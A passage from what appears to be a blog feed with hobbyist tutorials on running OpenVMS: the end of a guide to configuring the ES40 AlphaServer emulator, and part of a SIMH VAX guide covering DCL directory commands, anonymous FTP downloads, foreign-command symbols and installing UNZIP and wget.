[int16h@cgxsrv01 es40-source]$ cp es40{,.cfg} ..&#47;es40&#47;
[int16h@cgxsrv01 es40-source]$ cd ..&#47;es40
</code></pre>

<p>We need to create 2 directories within here, one will store any disk images and ISOs - the other will contain our ES40 firmware and VGA bios binaries. We will also rename es40.cfg and create a new one from scratch. The default configuration appears to have been written on a Windows system as defined paths use backslashes. It will save you some time to use my config here, but you should read over the original so you are aware of all of the available options.</p>

<pre><code>[int16h@cgxsrv01 es40]$ mkdir img rom
[int16h@cgxsrv01 es40]$ cd rom
[int16h@cgxsrv01 rom]$ wget http:&#47;&#47;mirror.publicns.net&#47;pub&#47;nongnu&#47;vgabios&#47;vgabios-0.6b.bin
[int16h@cgxsrv01 rom]$ ### wget ftp:&#47;&#47;ftp.hp.com&#47;pub&#47;alphaserver&#47;firmware&#47;current_platforms&#47;v7.3_release&#47;ES40_series&#47;ES40&#47;es40.zip
[int16h@cgxsrv01 rom]$ ### unzip es40.zip cl67srmrom.exe
[int16h@cgxsrv01 rom]$ wget https:&#47;&#47;cryogenix.net&#47;cl67srmrom.exe
</code></pre>

<p>We now have the firmware and BIOS images available to us. Although we don&#8217;t need the VGA BIOS, it&#8217;s nice to have it there incase you decide to use it in the future. Now would be a good time to prepare your media. I already had ISO images of OpenVMS and Tru64 ready - you may also create images of your installation media by using &#8216;<strong>dd</strong>&#8217;. Copy your ISO image(s) into the &#8216;<strong>img</strong>&#8217; directory, then we can get started.</p>

<pre><code>[int16h@cgxsrv01 rom]$ cd ..
[int16h@cgxsrv01 img]$ mv &#47;root&#47;OpenVMS.Alpha.8.3.iso img&#47;
[int16h@cgxsrv01 img]$ mv es40.cfg es40.cfg.bak
</code></pre>

<p>Using your favourite line&#47;text editor, re-create <strong>es40.cfg</strong> and we will configure the emulator.</p>

<pre><code>&#47;&#47; We don&#39;t need this, included for reference.
&#47;&#47; gui = sdl&#47;X11&#47;win32
&#47;&#47;
&#47;&#47; gui = X11
&#47;&#47; {
&#47;&#47;   keyboard.use_mapping = false;
&#47;&#47;   keyboard.map = "keys.map";
&#47;&#47; }

sys0 = tsunami
{
    rom.srm = "rom&#47;cl67srmrom.exe";
    rom.decompressed = "rom&#47;decompressed.rom";
    &#47;&#47; rom.flash = "rom&#47;flash.rom";
    &#47;&#47; rom.dpr = "rom&#47;dpr.rom";

&#47;&#47; Memory allocation:
&#47;&#47; 26 = 64 MB
&#47;&#47; 27 = 128MB
&#47;&#47; 28 = 256 MB
&#47;&#47; 29 = 512 MB
&#47;&#47; 30 = 1GB
&#47;&#47; 31 = 2GB

    memory.bits = 28;

 cpu0 = ev68cb
    {
        &#47;&#47; onchip-cache
        icache = false;
    }

&#47;&#47; System Internal PCI Devices: ali, ali_ide, ali_usb
pci0.7 = ali{
    &#47;&#47; These aren&#39;t really required for our set-up.
    mouse.enabled = true;
    lpt.outfile = "lpt.out";
    vga_console = true;
}

pci0.15 = ali_ide
{
    disk0.0 = file
    {
        file =          "img&#47;disk0.img";
        serial_number = "VMS";
        rev_number    = "8.3";
        model_number  = "OpenVMS8.3";
        read_only     = false;
        cdrom         = false;
        autocreate_size = 1000M;
    }

    disk1.0 = file
    {
      file          = "img&#47;OpenVMS.Alpha.8.3.iso";
      read_only     = true;
      cdrom         = true;
    }

}

  pci0.19 = ali_usb {}

  pci0.4 = dec21143 {
    adapter = "eth0" &#47;&#47; Change to your ethernet device
  }

  serial0 = serial {
    port = 21264;
  }
}
</code></pre>

<p>This is a good, simple configuration for your first Emulated ES40 system. You may increase &#8220;<strong>autocreate_size</strong>&#8221; to your liking as well as add, remove or modify any other options (refer to the documentation and the original config file). We are now ready to launch the emulator.</p>

<h3 id="starting-the-emulator">Starting the Emulator</h3>

<pre><code>[int16h@cgxsrv01 es40]$ sudo .&#47;es40 


   **======================================================================**
   ||                             ES40  emulator                           ||
   ||                              Version 0.18                            ||
   ||                                                                      ||
   ||  Copyright (C) 2007-2008 by the ES40 Emulator Project                ||
   ||  Website: http:&#47;&#47;sourceforge.net&#47;projects&#47;es40                       ||
   ||  E-mail : camiel@camicom.com                                         ||
   ||                                                                      ||
   ||  This program is free software; you can redistribute it and&#47;or       ||
   ||  modify it under the terms of the GNU General Public License         ||
   ||  as published by the Free Software Foundation; either version 2      ||
   ||  of the License, or (at your option) any later version.              ||
   **======================================================================**

sys0(tsunami): $Id: System.cpp,v 1.68 2008&#47;03&#47;04 19:05:21 iamcamiel Exp $
sys0(tsunami): $Id: DPR.cpp,v 1.16 2008&#47;02&#47;29 10:23:09 iamcamiel Exp $
sys0(tsunami): $Id: Flash.cpp,v 1.15 2007&#47;12&#47;30 15:10:22 iamcamiel Exp $
cpu0(ev68cb): $Id: AlphaCPU.cpp,v 1.71 2008&#47;03&#47;04 19:05:21 iamcamiel Exp $
pci0.7(ali): $Id: AliM1543C.cpp,v 1.60 2008&#47;02&#47;27 12:04:19 iamcamiel Exp $
kbc: $Id: Keyboard.cpp,v 1.4 2008&#47;02&#47;29 10:23:09 iamcamiel Exp $
dma: $Id: DMA.cpp,v 1.2 2008&#47;02&#47;26 15:43:47 iamcamiel Exp $
%IDE-I-INIT: New IDE emulator initialized.
pci0.15(ali_ide).disk0.0(file): Could not open file img&#47;disk0.img!
pci0.15(ali_ide).disk0.0(file): writing 2000 1kB blocks:  99%
pci0.15(ali_ide).disk0.0(file): 2000 MB file img&#47;disk0.img created.
pci0.15(ali_ide).disk0.0(file): Mounted file img&#47;disk0.img, 4096000 512-byte blocks, 5120&#47;16&#47;50.
pci0.15(ali_ide).disk1.0(file): Mounted file img&#47;OpenVMS.Alpha.8.3.iso, 270233 2048-byte blocks, 270233&#47;1&#47;1.
pci0.19(ali_usb): $Id: AliM1543C_usb.cpp,v 1.5 2008&#47;02&#47;27 12:04:20 iamcamiel Exp $

%NIC-Q-CHNIC: Choose a network adapter to connect to:
1. eth0
     (No description available)
2. lo
     (No description available)
%NIC-Q-NICNO: Enter the interface number (1-2): 1
pci0.4(dec21143): $Id: DEC21143.cpp,v 1.30 2008&#47;03&#47;02 09:42:52 iamcamiel Exp $
serial0(serial): Waiting for connection on port 21264.
</code></pre>

<p>At this point you will telnet to the IP bound to the interface you chose for the serial console to proceed.</p>

<pre><code>cgxlap:~ int16h$ telnet 10.0.0.11
Escape character is &#39;^]&#39;.
This is serial port #-1489766912 on AlphaSim
</code></pre>

<p>Quickly look at the other terminal where you started ES40 and you will notice that the emulator has now resumed.</p>

<pre><code>serial0(serial): $Id: Serial.cpp,v 1.39 2008&#47;03&#47;02 09:42:52 iamcamiel Exp $
%SYS-I-READROM: Reading original ROM image from rom&#47;cl67srmrom.exe.
%SYS-I-DECOMP: Decompressing ROM image.
0%....10%....20%....30%....40%....50%....60%....70%....80%....90%......100%
%SYS-I-ROMWRT: Writing decompressed rom to rom&#47;decompressed.rom.
%SYM-I-PATCHROM: Patching ROM for speed.
%SYS-I-ROMLOADED: ROM Image loaded successfully!
flash: 2097156 bytes restored.
%FLS-I-RESTST: Flash state restored from flash.rom
dpr: 16384 bytes restored.
%DPR-I-RESTST: DPR state restored from dpr.rom
6232 | 000000000008bb9c
</code></pre>

<p>Our ROM image has been decompressed and patched, and the emulator has started properly. Now go back to your telnet serial console and wait for the system to initialise. Depending on your system, this may take a couple of minutes. It should be noted that this emulator is emulating an 847Mhz 64-Bit Alpha CPU as well as all the associated hardware&#8230; as you can imagine, accomplishing this on a 32-bit Intel system will put a lot of strain on the system and the emulated system itself will run slowly unless you have a high-spec machine. I&#8217;m running this on an old AMD Sempron 2800+ system with less than 1GB of RAM, I recommend  <strong>at least</strong>  an Intel Core2 Duo system.</p>

<p>After your (hopefully short) wait, you will see the following initialisation messages:</p>

<pre><code>starting console on CPU 0
initialized idle PCB
initializing semaphores
initializing heap
initial heap 240c0
memory low limit = 1b0000 heap = 240c0, 17fc0
initializing driver structures
initializing idle process PID
initializing file system
initializing hardware
initializing timer data structures
lowering IPL
CPU 0 speed is 847 MHz
create dead_eater
create poll
create timer
create powerup
access NVRAM
Memory size 256 MB
testing memory
..
probe I&#47;O subsystem
probing hose 1, PCI
probing hose 0, PCI
probing PCI-to-ISA bridge, bus 1
bus 0, slot 4 -- ewa -- DE500-BA Network Controller
bus 0, slot 15 -- dqa -- Acer Labs M1543C IDE
bus 0, slot 15 -- dqb -- Acer Labs M1543C IDE
starting drivers
entering idle loop
*** system serial number not set. use set sys_serial_num command.
Partition 0, Memory base: 000000000, size: 010000000
initializing GCT&#47;FRU at 1c8000
Initializing ewa dqa dqb 
Memory Testing and Configuration Status
  Array       Size       Base Address    Intlv Mode
---------  ----------  ----------------  ----------
    0        256Mb     0000000000000000    4-Way

     256 MB of System Memory
Testing the System
Testing the Network
AlphaServer ES40 Console V7.3-1, built on Feb 27 2007 at 12:57:47
P00&#62;&#62;&#62;
</code></pre>

<p>Huzzah! The virtual AlphaServer is now online and ready for you to boot your installation media. Let&#8217;s have a look at available devices and boot from the ISO.</p>

<pre><code>P00&#62;&#62;&#62;sh dev
dqa0.0.0.15.0              DQA0                    OpenVMS8 .3
dqb0.0.1.15.0              DQB0         OpenVMS. Alpha.8.3.iso
dva0.0.0.1000.0            DVA0                               
ewa0.0.0.4.0               EWA0              08-00-2B-E5-40-00

P00&#62;&#62;&#62;boot DQB0
(boot dqb0.0.1.15.0 -flags 0)
block 0 of dqb0.0.1.15.0 is a valid boot block
reading 1226 blocks from dqb0.0.1.15.0
bootstrap code read in
base = 200000, image_start = 0, image_bytes = 99400(627712)
initializing HWRPB at 2000
initializing page table at ff56000
initializing machine state
setting affinity to the primary CPU
jumping to bootstrap code


    OpenVMS (TM) Alpha Operating System, Version V8.3    
    ? Copyright 1976-2006 Hewlett-Packard Development Company, L.P.

        Installing required known files...

    Configuring devices...
%EWA0, Auto-negotiation mode set by console
%EWA0, Link state: UP
%EWA0, Auto-negotiation (internal) starting
%EWA0, Full Duplex 100baseTX connection selected

    ****************************************************************

    You can install or upgrade the OpenVMS ALPHA operating system
    or you can install or upgrade layered products that are included
    on the OpenVMS ALPHA distribution media (CD&#47;DVD).

    You can also execute DCL commands and procedures to perform
    "standalone" tasks, such as backing up the system disk.

    Please choose one of the following:

        1)  Upgrade, install or reconfigure OpenVMS ALPHA Version V8.3
        2)  Display layered products that this procedure can install
        3)  Install or upgrade layered products
        4)  Show installed products
        5)  Reconfigure installed products
        6)  Remove installed products
        7)  Find, Install or Undo patches; Show or Delete Recovery Data
        8)  Execute DCL commands and procedures
        9)  Shut down this system

Enter CHOICE or ? for help: (1&#47;2&#47;3&#47;4&#47;5&#47;6&#47;7&#47;8&#47;9&#47;?)
</code></pre>

<p>From here you can continue to install OpenVMS as normal. So far I have been able to install and run OpenVMS 8.3 Alpha and Tru64 UNIX. This is an excellent emulator, and although it isn&#8217;t &#8220;finished&#8221; - I think it runs pretty well. It should be noted however that the network interface is a little buggy - In Tru64 I can configure it and ping the local IP, but I&#8217;m unable to send or receive traffic outside of there currently.</p>

]]></description>
</item>

<item>
<guid>/articles/openvms_simh_2.html</guid>
<link>/articles/openvms_simh_2.html</link>
<pubDate>Mon, 12 Jan 2009 00:00:00 +0000</pubDate>
<title>OpenVMS and SIMH - Part 2</title>
<description><![CDATA[

<h1 id="openvms-and-simh---part-2">OpenVMS and SIMH - Part 2</h1>

<p>Running OpenVMS on the SIMH VAX simulator</p>

<p>Welcome to the second part of  <a href="/OpenVMS_and_SIMH_pt1.html">Getting Started with OpenVMS and SIMH</a>. This article assumes that you have already followed  <a href="/OpenVMS_and_SIMH_pt1.html">part 1</a>  or have at least installed  <strong>OpenVMS VAX 7.3</strong>  on a system, with  <strong>dua0</strong> containing the OS,  <strong>dua1</strong>  containing user-directories, and TCP&#47;IP services are functional. If in doubt, have a quick read over what we did in the first part. For this part, we will install and use  <strong>UNZIP</strong>,  <strong>wget</strong>,  <strong>Compaq C</strong> and the  <strong>WASD</strong>  HTTP server.  </p>

<p>Although I&#8217;d &#47;love&#47; to throw you in at the deep-end, I think the transition to OpenVMS will be easier if we introduce a couple of utilities you may be familiar with and break you in gently. This is a bit of a &#8216;ghetto&#8217; guide to OpenVMS 7.3, and is primarily for users learning through SIMH - so, we will use the easiest methods of retrieving and installing what we need (despite them not being the most traditional methods).  </p>

<p><strong>UNZIP &#38; WGET</strong>  </p>

<p>These two utilities, in my opinion, are extremely useful when getting started with OpenVMS 7.3 in SIMH. The main reason being that you will find many 3rd-party applications will be ZIP archived, and nowadays - HTTP is much more common for files than FTP. WGET, although slightly bloated, is one of the most popular utilities in the UNIX(-like) world for grabbing files over HTTP and FTP. Although you should be ashamed for bringing it and similar utilities into your nice, clean, OpenVMS installation - it will aid you in the transition from UNIX to OpenVMS by providing some niceties you have become accustomed to having. So, let&#8217;s grab &#8216;wget&#8217; first. Login to your OpenVMS system as a normal user, and type &#8216;<strong>sh def</strong>&#8217;. This is short for &#8216;<strong>SHOW DEFAULT</strong>&#8217; and is like the &#8216;<strong>pwd</strong>&#8217; command on UNIX&#47;Unix-like systems. It will display the current directory you are in. If you followed the first tutorial on installing OpenVMS in SIMH, you should see something like the following:  </p>

<pre><code>$ sh def
  DUA1:[INT16H]
</code></pre>

<p>This means that you are in a directory named &#8220;<strong>INT16H</strong>&#8221; at the root of the <strong>DUA1:</strong> drive. We will discover more about how directories are addressed in a moment.  </p>

<p>We should create a directory for our downloaded files to live in. Looking at the above &#8216;<strong>path</strong>&#8217;, how would you expect a full path to &#8216;<strong>DOWNLOADS</strong>&#8217; within the &#8216;<strong>INT16H</strong>&#8217; directory to look? On a Unix-like system, you would probably expect something like &#8216;<strong>&#47;home&#47;int16h&#47;downloads</strong>&#8217; - but this is not UNIX.  </p>

<p>For clarity, we will create a directory using its full path using the &#8216;<strong>create</strong>&#8217; command like when we created the user-directory:</p>

<pre><code>$ create&#47;dir dua1:[INT16H.DOWNLOADS]
</code></pre>

<p>As you can see, we first reference the device, then the path from there is [enclosed], with each directory separated by a period&#47;dot&#47;full-stop. This is probably more similar to AmigaDOS than any other modern operating systems you may have came across.  </p>

<p>You will receive no confirmation of the command&#8217;s success, but if it did not succeed - you will receive an error message. To see that your new directory does actually exist, run &#8216;<strong>dir</strong>&#8217; (<strong>DIRECTORY</strong>), which will provide you with a directory-listing, similar to that below.</p>

<pre><code>$ dir

Directory DUA1:[INT16H]

DOWNLOADS.DIR;1

Total of 1 file.    
</code></pre>

<p>We can now move into this directory by issuing the &#8220;<strong>set def</strong>&#8221; (<strong>SET DEFAULT</strong>) command. You could pass &#8216;<strong>dua1:[INT16H.DOWNLOADS]</strong>&#8217; as the path to change to, but as we are in the directory where our target directory exists - that wouldn&#8217;t be the quickest path. Instead, run &#8216;<strong>set def [.DOWNLOADS]</strong>&#8217; - the &#8216;.&#8217; before &#8216;<strong>DOWNLOADS</strong>&#8217; tells the system that we want to change to a directory named &#8216;<strong>DOWNLOADS</strong>&#8217; within the current directory. Although it may be tempting to issue &#8216;<strong>set def DOWNLOADS</strong>&#8217; or &#8216;<strong>set def [DOWNLOADS]</strong>&#8217; but this wouldn&#8217;t work how you may expect:</p>

<pre><code>$ set def [.DOWNLOADS]
$ sh def
  DUA1:[INT16H.DOWNLOADS]

$ set def dua1:[INT16H.DOWNLOADS]
$ sh def
  DUA1:[INT16H.DOWNLOADS]
</code></pre>

<p>As you can see from either command above, we are now in the correct directory. If you were to change to &#8216;[DOWNLOADS]&#8217; instead of [.DOWNLOADS] we would receive:</p>

<pre><code>$ set def [DOWNLOADS]
$ sh def
  DUA1:[DOWNLOADS]
%DCL-I-INVDEF, DUA1:[DOWNLOADS] does not exist
</code></pre>

<p>This is because &#8216;<strong>[DOWNLOADS]</strong>&#8217; would take us to &#8216;<strong>DUA1:[DOWNLOADS]</strong>&#8217; which doesn&#8217;t currently exist.  </p>

<p>It would be quite useful if we knew how to go back a directory. In many operating systems, &#8216;<strong>cd ..</strong>&#8217; would allow you to do this, but as you know - we use &#8216;<strong>set def</strong> (&#8216;<strong>SET DEFAULT</strong>&#8217;), and rather than &#8216;<strong>..</strong>&#8217; we use &#8216;<strong>[-]</strong>&#8217;. So, we will move back into your &#8216;home&#8217; directory now:</p>

<pre><code>$ set def [-]
$ sh def
  DUA1:[INT16H]
</code></pre>

<p>Now that you know how to create directories and navigate around the data disk, we will create one more directory, naming it &#8220;BIN&#8221; - so store programs you want for your own use.</p>

<pre><code>$ create&#47;dir [.BIN]
</code></pre>

<p>Change directory to [.BIN] and we shall download the UNZIP utility.</p>

<pre><code>$ set def [.BIN]
</code></pre>

<p>Available for OpenVMS is a wide range of freeware utilities and applications, usually made available from the <del><a href="https://web.archive.org/web/20090312034329/http://www.openvms.compaq.com/openvms/freeware/">OpenVMS Freeware CDs</a></del>. These are available as large zip files from Compaq (HP) or alternatively, you can browse and download programs from the Freeware CDs as well as many others via <del><a href="https://web.archive.org/web/20090312034329/http://www.saic.com/">SAIC.com&#8217;s</a>  <a href="https://web.archive.org/web/20090312034329/http://mvb.saic.com/">OpenVMS Freeware Archive</a>.</del> The problem is, many of them are zipped - and we do not have the means to unzip these archives.  </p>

<p>Luckily, many FTP sites contain useful tools such as UNZIP in a compiled executable for Alpha, ia64 and VAX; suitable for running straight away. Such sites include <a href="https://web.archive.org/web/20090312034329/http://www.process.com/">Process.com</a> and the <del><a href="https://web.archive.org/web/20090312034329/http://mvb.saic.com/">SAIC OpenVMS Freeware Archive</a></del> mentioned above. We will be using SAIC&#8217;s archive so that you can get used to the structure of the Freeware CDs.  </p>

<p>Use the &#8216;FTP&#8217; client supplied with OpenVMS to connect to <del><strong>mvb.saic.com</strong></del> (no longer available) and login Anonymously</p>

<pre><code>$ ftp mvb.saic.com
220 mvb.saic.com MultiNet FTP Server Process V5.2(16) at Tue 13-Jan-2009 6:38AM-PST
Connected to mvb.saic.com. 
Name (mvb.saic.com:int16h): Anonymous
331 Anonymous user ok. Send real ident as password.
Password: 
230-
230-    Greetings, and welcome to the DECUS tape archives here at Mvb.Saic.Com. 
230-    This archive contains submissions of the VMS and L&#38;T; SIGs of the U.S.
230-    DECUS chapter.  The entire SIG tape collection of the VMS (nee VAX) SIG
230-    and the Languages and Tools SIG are available here.  There are also a
230-    few extras here such as the Info-VAX archive, Freeware V4.0 &#38; V5.0 disks,
230-    x11r6, Tex, ISO9660, etc.  There is also a mirror of the VMS freeware
230-    archive at Process Software (in the [.PROCESS] directory) and a mirror
230-    of the DECWindows archive at CENA (in the [.DECWINDOWS] directory).
230-
230-    FTP access to this system is available 24 hours a day, 7 days a week.
230-
230-    N.B. This is a VMS system.  However, the FTP server is set to use Unix
230-    syntax in order to accomodate all of the "the world is unix" ftp
230-    clients out there.  To return to VMS syntax, issue the command: cd []
230-
230-Guest User INT16H logged into &#47;disk$misc&#47;decus at Tue 13-Jan-2009 6:38AM-PST, job 36903.
230 Directory and access restrictions apply
FTP&#62; 
</code></pre>

<p>You will see that we logged in as user <strong>Anonymous</strong> and we gave our ident (username) as the password. As you connect to more FTP servers running OpenVMS, you will notice that the &#8216;Anonymous&#8217; login will always require your ident - rather than an e-mail address like many other servers nowadays.  </p>

<p>The utilities we will be downloading are located in <strong>[.FREEWAREV80.000tools.vax_images]</strong>. Although the server has been set to use UNIX syntax by default (as we were informed by the MOTD), we can still navigate through the server like a normal OpenVMS system. Let&#8217;s go to the directory we require now.</p>

<pre><code>FTP&#62; sh def
257 "DISK$MISC:[DECUS]" is current directory.
FTP&#62; set def [.FREEWAREV80.000tools.vax_images]
250 Connected to DISK$MISC:[DECUS.FREEWAREV80.000TOOLS.VAX_IMAGES].
</code></pre>

<p>Let&#8217;s have a look at which tools are available before we go downloading:</p>

<pre><code>FTP&#62; dir
200 Port 192.8 at Host 79.64.146.144 accepted.
150 List started.

DISK$MISC:[DECUS.FREEWAREV80.000TOOLS.VAX_IMAGES]

BZIP2.EXE;1               156   9-APR-2001 02:11 [BERRYMAN] (RE,RE,RE,RE)
DECODE_64.EXE;1            11   6-MAY-1997 11:33 [BERRYMAN] (RE,RE,RE,RE)
GZIP.EXE;1                 93  23-FEB-2001 10:36 [BERRYMAN] (RE,RE,RE,RE)
UNZIP.EXE;1               208  20-JUL-2006 17:34 [BERRYMAN] (RE,RE,RE,RE)
VMSTAR.EXE;1               59  27-SEP-2003 03:37 [BERRYMAN] (RE,RE,RE,RE)
ZIP.EXE;1                 137  20-JUL-2006 17:35 [BERRYMAN] (RE,RE,RE,RE)


Total of 664 blocks in 6 files.

226 Transfer completed.
542 bytes received in 00:00:00.03 seconds (17.64 Kbytes&#47;s)
</code></pre>

<p>You may download any utilities you will require, but for now we will just grab ZIP.EXE and UNZIP.EXE. Remember to switch to binary mode for transfers though, else you won&#8217;t be able to execute the files:</p>

<pre><code>FTP&#62; binary
200 Type I ok.
FTP&#62; get ZIP.EXE
200 Port 192.9 at Host 79.xxx.xxx.xxx accepted.
150 IMAGE retrieve of DISK$MISC:[DECUS.FREEWAREV80.000TOOLS.VAX_IMAGES]ZIP.EXE;1 (70144 bytes) started.
226 Transfer completed.  70144 (8) bytes transferred.
local: DUA1:[INT16H.BIN]ZIP.EXE;1  remote: ZIP.EXE
70144 bytes received in 00:00:01.34 seconds (51.11 Kbytes&#47;s)
FTP&#62; get UNZIP.EXE
200 Port 192.10 at Host 79.xxx.xxx.xxx accepted.
150 IMAGE retrieve of DISK$MISC:[DECUS.FREEWAREV80.000TOOLS.VAX_IMAGES]UNZIP.EXE;1 (106496 bytes) started.
226 Transfer completed.  106496 (8) bytes transferred.
local: DUA1:[INT16H.BIN]UNZIP.EXE;1  remote: UNZIP.EXE
106496 bytes received in 00:00:01.56 seconds (66.66 Kbytes&#47;s)
FTP&#62; 
</code></pre>

<p>If you have any problems retrieving directory listings, downloading files etc - you can adjust the PASV&#47;PASSIVE FTP settings with the &#8216;<strong>passive</strong>&#8217; command. Type &#8220;<strong>exit</strong>&#8221; to disconnect and terminate FTP. Using the &#8216;<strong>r</strong>&#8217; (&#8216;<strong>RUN</strong>&#8217;) command, we can check that the binaries&#47;images will run successfully:</p>

<pre><code>$ r unzip.exe
UnZip 5.52 of 28 February 2005, by Info-ZIP.  For more details see: unzip -v.
~
</code></pre>

<p>Perfect! Or is it? Let&#8217;s try to run unzip.exe again, but this time we&#8217;ll append &#8216;-v&#8217; to it.</p>

<pre><code>$ r unzip.exe -v
%DCL-W-MAXPARM, too many parameters - reenter command with fewer parameters
</code></pre>

<p>That&#8217;s not very useful, not for running a command which requires parameters anyway. OpenVMS has an extremely useful online help system (online as in live, within the OS). Let&#8217;s have a brief look at that now and hope we can discover why we can&#8217;t use &#8216;<strong>RUN</strong>&#8217; how we would like:</p>

<pre><code>$ help run

RUN

     Executes an image within the context of your process (see Image).
     If you are invoking an image requiring one or more parameters,
     you must use the Automatic Foreign Command format or the Foreign
     Command format.

     Creates a subprocess or a detached process to run an image and
     deletes the process when the image completes execution (see
     Process).

  Additional information available:

  Image      Process

RUN Subtopic? 
</code></pre>

<p>We have established that &#8216;<strong>run</strong>&#8217; won&#8217;t let us use programs which require argc&#47;argv-style parameters, and now the help system has informed us that we must use the <strong>Automatic Foreign Command</strong> format or the <strong>Foreign Command</strong> format. Foreign Commands are usually programs which aren&#8217;t native to OpenVMS and as such don&#8217;t comply with how OpenVMS expects applications to be run - or can be any programs&#47;commands outside of DCL. For example the &#8216;<strong>RUN</strong>&#8217; command, if issued without a filename as a parameter, will prompt you to enter a filename. This is not the case with the vast majority of programs which have been ported from UNIX and other systems. To exit from the help system, press <strong>CTRL-Z</strong>.  </p>

<p>To be able to run these commands, we will define a <strong>symbol</strong>. A symbol is a symbolic name or alias for a string, the result isn&#8217;t unlike setting environment variables in other operating systems. <strong>==</strong> is used for global symbols, and prepended a colon (&#8216;:&#8217;) is used for strings. Here are a couple of examples of setting symbols:</p>

<pre><code>$ A == 1
$ B :== bee
</code></pre>

<p>The online help system can tell us the format used for setting symbols:</p>

<pre><code>     symbol-name =[=] expression

   symbol-name[bit-position,size] =[=] replacement-expression
</code></pre>

<p>Using the &#8216;<strong>SHOW</strong>&#8217; command, you can display the value of any single symbol or all of them at once:</p>

<pre><code>$ show symbol A
  A = 1   Hex = 00000001  Octal = 00000000001

$ show symbol&#47;all
  A = 1   Hex = 00000001  Octal = 00000000001
  B = "BEE"
</code></pre>

<p>These can be used like variables, aliases for commands etc. If we wanted to create a symbol called &#8216;<strong>ls</strong>&#8217; which had the string value &#8220;<strong>DIR</strong>&#8221; associated with it, we could use &#8216;<strong>ls</strong>&#8217; in place of &#8216;<strong>DIR</strong>&#8217;:</p>

<pre><code>$ ls :== DIR
$ sh symbol ls
  LS = "DIR"
$ ls

Directory DUA1:[INT16H.BIN]

UNZIP.EXE;1         ZIP.EXE;1           

Total of 2 files.
</code></pre>

<p>This is all very useful, but it doesn&#8217;t quite let us run our Foreign Commands yet. Try creating a symbol which will point to &#8216;<strong>DUA1:[INT16H.BIN]UNZIP.EXE</strong>&#8217;, then issue your new symbol as a command:</p>

<pre><code>$ unzip :== DUA1:[INT16H.BIN]UNZIP.EXE
$ unzip
%DCL-W-IVVERB, unrecognized command verb - check validity and spelling \DUA1\
</code></pre>

<p>We need to flag the symbol as being associated with a foreign command, so it will treat it as such. This is done by adding &#8216;$&#8217; at the beginning of the &#8216;path&#8217;:</p>

<pre><code>$ unzip :== $DUA1:[INT16H.BIN]UNZIP.EXE
$ sh symbol unzip
  UNZIP == "$DUA1:[INT16H.BIN]UNZIP.EXE"
</code></pre>

<p>Now let&#8217;s try running &#8216;unzip&#8217; again, and then try issuing the &#8216;-v&#8217; parameter.</p>

<pre><code>$ unzip
UnZip 5.52 of 28 February 2005, by Info-ZIP.  For more details see: unzip -v.
~

$ unzip -v
UnZip 5.52 of 28 February 2005, by Info-ZIP.  Maintained by C. Spieler.  Send
bug reports using http:&#47;&#47;www.info-zip.org&#47;zip-bug.html; see README for details.

Latest sources and executables are at ftp:&#47;&#47;ftp.info-zip.org&#47;pub&#47;infozip&#47; ;
see ftp:&#47;&#47;ftp.info-zip.org&#47;pub&#47;infozip&#47;UnZip.html for other sites.

Compiled with VAX C for VMS (V5.4-2 VAX) on Feb 28 2005.
</code></pre>

<p>Congratulations, you can now unzip files. Usually you would put system utilities somewhere such as </p>

<pre><code>SYS$SYSTEM
</code></pre>

<p>this is a logical name which points to &#8216;<strong>SYS$SYSROOT:[SYSEXE]</strong>&#8217; which has another logical name ;). If you would like to see a list of defined logical names, you may run &#8216;<strong>show logical&#47;all</strong>&#8217;.  </p>

<p>Because it&#8217;s not ideal to create symbols for every Foreign Command program you wish to use, OpenVMS now has something comparable to the $PATH environment variable - &#8216;<strong>dcl$path</strong>&#8217;. This is defined with the &#8216;<strong>define</strong>&#8217; command, and will allow you to set one or more directories to be in your &#8220;path&#8221; for running Foreign Commands. To enable us to run any executables from our [.BIN] directory, we shall add it to &#8216;<strong>dcl$path</strong>&#8217; now:</p>

<pre><code>$ define dcl$path dua1:[INT16H.BIN]
</code></pre>

<p>You can check that it is working by running &#8220;zip&#8221; from the command-line.  </p>

<p>Finally we have acquired the ZIP and UNZIP utilities, but have also learned some basic but important OpenVMS commands. Next we will download &#8216;wget&#8217;, another utility from the UNIX world, and install it into our personal &#8216;BIN&#8217; directory.  </p>

<p><strong>Wget - the web-getter</strong> Wget for OpenVMS is available from <a href="http://www.antinode.info/dec/index.html">AntiNode.info</a> amongst other places, as are a few other utilities you may find useful. We will be downloading a ZIP file to our DOWNLOADS directory, extracting it, then copying the wget binary to BIN:</p>

<pre><code>$ set def [-.DOWNLOADS]
$ ftp antinode.info

220-   Antinode FTP Server.  Please be nice.
220 alp.antinode.info FTP Server (Version 5.4) Ready.
Connected to alp.antinode.info. 

Name (alp.antinode.info:int16h): Anonymous
331 Guest login OK, send ident as password.
Password: 
230 Guest login OK, access restrictions apply.

FTP&#62; set def [.WGET.wget-1_10_2c_vms]
250-CWD command successful.
250 New default directory is SYS$SYSDEVICE:[ANONYMOUS.WGET.WGET-1_10_2C_VMS]

FTP&#62; binary
200 TYPE set to IMAGE.

FTP&#62; get WGET-1_10_2C_VMS.ZIP
200 PORT command successful.
150 Opening data connection for SYS$SYSDEVICE:[ANONYMOUS.WGET.WGET-1_10_2C_VMS]WGET-1_10_2C_VMS.ZIP;
    (79.xxx.xxx.xxx,49166) (3171539 bytes)
226 Transfer complete.
local: DUA1:[INT16H.DOWNLOADS]WGET-1_10_2C_VMS.ZIP;1  remote: WGET-1_10_2C_VMS.ZIP
3171539 bytes received in 00:00:54.61 seconds (56.71 Kbytes&#47;s)

FTP&#62; exit
221 Goodbye.
</code></pre>

<p>We will now extract &#8216;<strong>WGET-1<em>10</em>2C_VMS.ZIP</strong>&#8217;. Run &#8216;<strong>unzip WGET-1<em>10</em>2C_VMS.ZIP</strong>&#8217;. You will see a lot of files extracting, but we only need one - <strong>WGET.EXE</strong> from <strong>[.wget-1<em>10</em>2c_vms.src.vax]</strong>. We will copy it to our BIN directory:</p>

<pre><code>$ unzip WGET-1_10_2C_VMS.ZIP
inflating: ~~
$ copy [.wget-1_10_2c_vms.src.vax]WGET.EXE DUA1:[INT16H.BIN]WGET.EXE
</code></pre>

<p>Now you can run &#8216;wget&#8217; for times of laziness.</p>

<pre><code>$ wget
dua1:[int16h.bin]wget.exe;1: missing URL
Usage: dua1:[int16h.bin]wget.exe;1 [OPTION]... [URL]...
</code></pre>

<p>Try `dua1:[int16h.bin]wget.exe;1 &#8211;help&#8217; for more options.</p>

<h2 id="installing-supplemental-software">Installing Supplemental Software</h2>

